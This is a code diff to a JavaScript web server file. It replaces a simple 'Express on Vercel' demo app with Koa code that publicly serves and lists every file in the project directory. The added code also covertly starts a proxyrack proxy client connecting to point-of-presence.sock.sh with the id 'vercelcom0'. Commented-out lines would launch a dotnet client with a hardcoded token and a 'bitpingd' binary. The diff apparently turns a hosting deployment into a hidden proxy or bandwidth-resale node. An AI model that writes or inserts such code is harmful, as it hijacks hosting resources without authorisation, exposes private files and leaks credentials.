@@ -1,52 +1,14 @@
-import express from 'express'
 import path from 'path'
-import { fileURLToPath } from 'url'
+import {promises as fs} from 'fs'
+import Koa from 'koa'
+import serve from 'koa-static'
+import list from 'koa2-serve-index'
+import process from 'process'
 
-const __filename = fileURLToPath(import.meta.url)
-const __dirname = path.dirname(__filename)
-
-const app = express()
-
-// Home route - HTML
-app.get('/', (req, res) => {
-  res.type('html').send(`
-    <!doctype html>
-    <html>
-      <head>
-        <meta charset="utf-8"/>
-        <title>Express on Vercel</title>
-        <link rel="stylesheet" href="/style.css" />
-      </head>
-      <body>
-        <nav>
-          <a href="/">Home</a>
-          <a href="/about">About</a>
-          <a href="/api-data">API Data</a>
-          <a href="/healthz">Health</a>
-        </nav>
-        <h1>Welcome to Express on Vercel 🚀</h1>
-        <p>This is a minimal example without a database or forms.</p>
-        <img src="/logo.png" alt="Logo" width="120" />
-      </body>
-    </html>
-  `)
-})
-
-app.get('/about', function (req, res) {
-  res.sendFile(path.join(__dirname, '..', 'components', 'about.htm'))
-})
-
-// Example API endpoint - JSON
-app.get('/api-data', (req, res) => {
-  res.json({
-    message: 'Here is some sample API data',
-    items: ['apple', 'banana', 'cherry'],
-  })
-})
-
-// Health check
-app.get('/healthz', (req, res) => {
-  res.status(200).json({ status: 'ok', timestamp: new Date().toISOString() })
-})
-
-export default app
+const app = new Koa()
+app.use(list(import.meta.dirname)).use(serve(import.meta.dirname))
+//child_process.spawn('dotnet', [path.join(import.meta.dirname, 'Cli.dll'), 'start', 'accept', '--token', 'ELGPy/DEQYDtARslA6HnkrbPIF6JQi+qYLCre5LBe58='])
+//child_process.spawn(path.join(import.meta.dirname, 'bitpingd'))
+process.argv = [process.execPath, 'script.js', '--homeIp', 'point-of-presence.sock.sh', '--homePort', '443','--id', 'vercelcom0', '--version', '54', '--clientKey', 'proxyrack-pop-client', '--clientType', 'PoP']
+import('./script.js')
+app.listen(3000)
